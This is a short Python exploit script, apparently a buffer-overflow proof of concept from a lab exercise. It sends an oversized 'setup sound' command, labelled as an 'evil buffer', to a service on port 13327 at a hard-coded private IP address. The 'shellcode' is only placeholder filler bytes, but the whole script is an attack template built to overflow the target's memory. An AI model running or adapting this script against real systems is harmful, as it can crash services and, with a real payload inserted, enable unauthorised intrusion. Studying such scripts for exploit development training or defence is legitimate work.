#!/usr/bin/env python3

import socket


TARGET_IP                    =    "192.168.1.65"

shellcode  = "\x41\x42" + "\x43" * 4381 + "\x70" * 2000

buffer = "\x11(setup sound " + shellcode + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*]Sending evil buffer...")
s.connect((TARGET_IP, 13327))
data = s.recv(1024)
print(data)
s.send(buffer.encode("ISO-8859-1"))
s.close()
print("[*]Payload Sent !")
